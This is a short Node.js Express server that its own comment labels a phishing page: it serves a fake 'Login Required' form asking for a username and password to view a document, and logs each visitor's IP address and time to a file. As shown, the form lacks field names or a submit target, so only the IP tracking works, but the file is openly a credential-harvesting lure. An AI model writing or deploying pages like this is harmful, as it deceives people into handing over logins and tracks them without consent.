const express = require('express');
const fs = require('fs');
const app = express();
const PORT = 3000;

// Serve the phishing page
app.get('/', (req, res) => {
    // Log who accessed
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    fs.appendFileSync('log.txt', `Opened by IP: ${ip} at ${new Date().toISOString()}\n`);
    
    res.send(`
      <html>
      <head><title>Login Required</title></head>
      <body>
          <h1>Please log in to view the document</h1>
          <form>
              <input type="text" placeholder="Username" /><br/>
              <input type="password" placeholder="Password" /><br/>
              <button>Login</button>
          </form>
      </body>
      </html>
    `);
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
